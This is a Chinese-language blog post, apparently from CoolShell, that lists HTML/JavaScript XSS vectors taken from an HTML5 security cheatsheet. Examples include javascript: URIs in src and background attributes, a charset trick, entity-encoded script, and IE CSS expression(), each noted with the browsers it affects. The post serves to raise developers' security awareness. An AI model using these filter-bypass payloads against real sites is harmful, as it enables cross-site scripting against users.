@@ -1,0 +1,41 @@
+<html><body><p>下面这个网站罗列了，几乎所有的关于HTML 5 在各种主流浏览器上的安全问题，这些安全问题很有可能将会是黑客攻击你的网上的敲门砖，他们几乎都和Javascript都有关系，你就要好好注意了。</p>
+<p style="text-align: center;"><a href="http://heideri.ch/jso/" target="_blank"><strong>http://heideri.ch/jso/</strong></a></p>
+<p style="text-align: left;">下面罗列几个：</p>
+<p style="text-align: left;"><strong>1）&lt;table background=”javascript:alert(1)”&gt;</strong></p>
+<p style="text-align: left;">IE6，7，8，9，和Opera 8.x, 9.x, 10.x 都支持这样的语法。</p>
+<p style="text-align: left;"><strong>2）&lt;meta charset=”mac-farsi”&gt;¼script¾alert(1)¼/script¾</strong></p>
+<p style="text-align: left;">这个问题会存在于所有的Firefox版本中，可以让用户进行XSS（跨站脚本）攻击</p>
+<p style="text-align: left;"><strong>3）&lt;script&gt;&amp;amp;#x61;l&amp;amp;#x65;rt&amp;amp;#40;1)&lt;/script&gt;</strong></p>
+<p style="text-align: left;">在&lt;script&gt;和&lt;style&gt;的TAG间，根据标据，其可以使用这样的字符来运行脚本。这在所有版本的Firefox, Opera, 和 Chrome中都会有问题。</p>
+<p style="text-align: left;"><span id="more-2416"></span></p>
+<p style="text-align: left;"><strong>4）({set/**/$($){_/**/setter=$,_=1}}).$=alert</strong></p>
+<p style="text-align: left;">上面这个是Firefox的一个<a href="https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters" target="_blank">语法</a>，也会产生XSS攻击。</p>
+<p style="text-align: left;"><strong>5）&lt;div style=”font-family:foo}x=expression(write(1));”&gt;XXX&lt;/div&gt;</strong></p>
+<p style="text-align: left;">自从IE5.5后，直到IE9，IE就可以支持上面这样的语法。</p>
+<p style="text-align: left;"><strong>6）src中是可以运行脚本的，如：</strong></p>
+<p style="text-align: left; padding-left: 30px;">&lt;embed src=”javascript:alert(1)”&gt;<br/>
+&lt;img src=”javascript:alert(1)”&gt;<br/>
+&lt;image src=”javascript:alert(1)”&gt;<br/>
+&lt;script src=”javascript:alert(1)”&gt;</p>
+<p style="text-align: left;">又一个XSS攻击，几乎所有的浏览器都支持这样的方式，如：Firefox全部版本，Chrome 4.x/5.x，Opera 8.x/9.x/10.0，IE 6.0/7.0和Safari 3.x/4.x</p>
+<p style="text-align: left;">
+</p><p style="text-align: left;">还有很多，大家自己去看吧，这个网站经常更新的。总体感觉下来，IE和Firefox的安全问题都在伯仲之间，Safari貌似是问题最少的。</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px; color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+<div class="wp_rp_wrap wp_rp_vertical_m"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/21708.html"><img alt="网络数字身份认证术" height="150" src="../wp-content/uploads/2022/01/iStock-1175502114-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/21708.html">网络数字身份认证术</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/19395.html"><img alt="HTTP API 认证授权术" height="150" src="../wp-content/uploads/2019/05/Authorization-360x200-1-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/19395.html">HTTP API 认证授权术</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18094.html"><img alt="如何免费的让网站启用HTTPS" height="150" src="../wp-content/uploads/2017/08/enable-https-banner-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/18094.html">如何免费的让网站启用HTTPS</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/17634.html"><img alt="Chrome开发者工具的小技巧" height="150" src="../wp-content/uploads/2017/01/pretty-code-150x150.gif" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/17634.html">Chrome开发者工具的小技巧</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/17607.html"><img alt="从 MongoDB “赎金事件” 看安全问题" height="150" src="../wp-content/uploads/2017/01/MongoDB-150x150.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/17607.html">从 MongoDB “赎金事件” 看安全问题</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/17066.html"><img alt="关于移动端的钓鱼式攻击" height="150" src="../wp-content/uploads/2015/04/phishing-1-150x150.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/17066.html">关于移动端的钓鱼式攻击</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/2416.html">HTML 安全列表</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.</body></html>
